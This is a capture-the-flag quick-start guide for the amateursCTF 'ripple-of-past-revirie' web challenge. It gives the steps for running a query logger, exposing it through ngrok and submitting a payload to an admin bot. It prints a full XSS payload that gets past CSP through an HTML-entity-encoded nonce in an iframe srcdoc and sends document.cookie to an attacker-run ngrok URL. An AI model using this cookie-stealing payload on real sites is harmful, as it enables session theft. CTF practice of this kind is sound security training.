# Quick Start Guide - Get the Flag NOW!

## Current Status
- ✅ Tools ready
- ✅ ngrok running (but needs reconfiguration)
- ⚠️ Need to update ngrok to point to port 8000

## 3 Steps to Get Flag

### Step 1: Start Query Logger
Open a **NEW terminal/cmd** and run:
```bash
cd c:\Users\Cyborg\Documents\GitHub\CTFs\Ametuer\ripple-of-past-revirie
python tools\query_logger.py --port 8000
```

Keep this running! You'll see the flag appear here.

### Step 2: Restart ngrok on Port 8000

**IMPORTANT**: Your current ngrok is on port 80. We need port 8000.

In your current ngrok terminal:
1. Press `Ctrl+C` to stop it
2. Run: `ngrok http 8000`
3. Copy the **HTTPS** URL (e.g., `https://something.ngrok-free.dev`)

### Step 3: Submit Payload

Open **another terminal** and run:
```bash
cd c:\Users\Cyborg\Documents\GitHub\CTFs\Ametuer\ripple-of-past-revirie
GET_FLAG.bat "https://YOUR_NGROK_URL_HERE"
```

**Example** (using your current ngrok domain):
```bash
GET_FLAG.bat "https://fimbrillate-intersegmental-shelli.ngrok-free.dev"
```

## What to Expect

After running Step 3:
1. The script will submit the XSS payload to the bot
2. Within 5-10 seconds, the bot visits the page
3. Your JavaScript executes and redirects to your ngrok URL
4. The **query_logger.py** terminal will show:
   ```
   [2025-...] GET /?c=flag%3DamateursCTF%7B...%7D
     - c = flag=amateursCTF{your_flag_here}
   ```

## Troubleshooting

**"No requests in query_logger"**
- Make sure ngrok is on port 8000 (not 80)
- Verify ngrok shows "Session Status: online"
- Wait 30 seconds and try again

**"Connection refused"**
- Ensure query_logger.py is running on port 8000
- Check firewall isn't blocking port 8000

**Rate limit**
- Bot accepts 10 submissions per minute
- If you hit the limit, wait 60 seconds

## Current URLs
- Application: https://web-ripple-of-past-revirie-a8hd38x0.amt.rs
- Bot Submit: https://web-ripple-of-past-revirie-tfk6tz07.amt.rs (default in script)
- Your ngrok: https://fimbrillate-intersegmental-shelli.ngrok-free.dev (UPDATE to port 8000!)

## The Payload
The script uses this XSS payload:
```html
<iframe srcdoc="<script nonce=&quot;%&#78;4%&#43;h2wfdFxXix7rCgwhVvA%&#61;%&#61;&quot;>
window.location='https://YOUR_NGROK/?c='+encodeURIComponent(document.cookie)
</script>"></iframe>
```

This bypasses CSP by encoding the nonce using HTML entities in the iframe's srcdoc attribute.

Good luck! 🚀
